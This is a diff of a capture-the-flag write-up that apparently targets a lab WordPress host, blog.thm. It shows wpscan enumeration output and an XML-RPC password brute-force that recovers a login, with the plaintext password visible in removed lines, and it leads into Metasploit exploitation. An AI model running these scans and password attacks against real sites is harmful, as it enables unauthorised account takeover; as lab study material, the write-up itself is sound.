@@ -74,7 +74,7 @@ Moving on...
 
 - Wpscan can be used to further assess the endpoint for Wordpress vulnerabilities: `wpscan --update` and `wpscan --url http://blog.thm`
  
-
+```
 Interesting Finding(s):
 
 [+] Headers
@@ -152,88 +152,9 @@ Interesting Finding(s):
 Trying kwheel / dallas1 Time: 00:05:25 <                                                                                                                                 > (2865 / 14347257)  0.01%  ETA: ??:??:??
 
 [!] Valid Combinations Found:
- | Username: kwheel, Password: cutiepie1
-
-
-Interesting Finding(s):
-
-[+] Headers
- | Interesting Entry: Server: Apache/2.4.29 (Ubuntu)
- | Found By: Headers (Passive Detection)
- | Confidence: 100%
-
-[+] robots.txt found: http://blog.thm/robots.txt
- | Interesting Entries:
- |  - /wp-admin/
- |  - /wp-admin/admin-ajax.php
- | Found By: Robots Txt (Aggressive Detection)
- | Confidence: 100%
-
-[+] XML-RPC seems to be enabled: http://blog.thm/xmlrpc.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
- | References:
- |  - http://codex.wordpress.org/XML-RPC_Pingback_API
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
- |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
- |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/
-
-[+] WordPress readme found: http://blog.thm/readme.html
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
-
-[+] Upload directory has listing enabled: http://blog.thm/wp-content/uploads/
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 100%
-
-[+] The external WP-Cron seems to be enabled: http://blog.thm/wp-cron.php
- | Found By: Direct Access (Aggressive Detection)
- | Confidence: 60%
- | References:
- |  - https://www.iplocation.net/defend-wordpress-from-ddos
- |  - https://github.com/wpscanteam/wpscan/issues/1299
-
-[+] WordPress version 5.0 identified (Insecure, released on 2018-12-06).
- | Found By: Rss Generator (Passive Detection)
- |  - http://blog.thm/feed/, <generator>https://wordpress.org/?v=5.0</generator>
- |  - http://blog.thm/comments/feed/, <generator>https://wordpress.org/?v=5.0</generator>
-
-[+] WordPress theme in use: twentytwenty
- | Location: http://blog.thm/wp-content/themes/twentytwenty/
- | Last Updated: 2025-12-03T00:00:00.000Z
- | Readme: http://blog.thm/wp-content/themes/twentytwenty/readme.txt
- | [!] The version is out of date, the latest version is 3.0
- | Style URL: http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3
- | Style Name: Twenty Twenty
- | Style URI: https://wordpress.org/themes/twentytwenty/
- | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
- | Author: the WordPress team
- | Author URI: https://wordpress.org/
- |
- | Found By: Css Style In Homepage (Passive Detection)
- | Confirmed By: Css Style In 404 Page (Passive Detection)
- |
- | Version: 1.3 (80% confidence)
- | Found By: Style (Passive Detection)
- |  - http://blog.thm/wp-content/themes/twentytwenty/style.css?ver=1.3, Match: 'Version: 1.3'
-
-[+] Enumerating All Plugins (via Passive Methods)
-
-[i] No plugins Found.
-
-[+] Enumerating Config Backups (via Passive and Aggressive Methods)
- Checking Config Backups - Time: 00:00:09 <===================================================================================================================================> (137 / 137) 100.00% Time: 00:00:09
-
-[i] No Config Backups Found.
-
-[+] Performing password attack on Xmlrpc against 1 user/s
-[SUCCESS] - kwheel / cutiepie1
-Trying kwheel / dallas1 Time: 00:05:25 <                                                                                                                                 > (2865 / 14347257)  0.01%  ETA: ??:??:??
-
-[!] Valid Combinations Found:
- | Username: kwheel, Password: *********
-
+ | Username: kwheel, Password: ********
+```
+ 
 # Exploitation
 
 The Metasploit Framework can be used to exploit Wordpress. 
